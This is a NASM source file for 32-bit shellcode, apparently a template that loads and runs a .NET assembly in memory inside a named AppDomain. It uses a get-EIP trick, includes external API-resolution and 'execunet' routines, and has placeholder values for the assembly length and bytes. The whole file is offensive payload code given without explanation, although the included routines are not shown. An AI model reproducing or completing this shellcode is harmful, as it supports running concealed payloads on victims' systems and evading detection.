BITS 32

%define APPDOMAIN_VALUE "aXbpOzzF"

segment .text
	call geteip
geteip:
	pop ebx
	call execunet
	ret

%include "sc-32-api-functions.asm"
%include "sc-32-execunet.asm"

APPDOMAINNAME:
	db __utf16__(APPDOMAIN_VALUE), 0, 0

ASSEMBLY_LENGTH 	equ 1094795585
ASSEMBLY:
db 0x00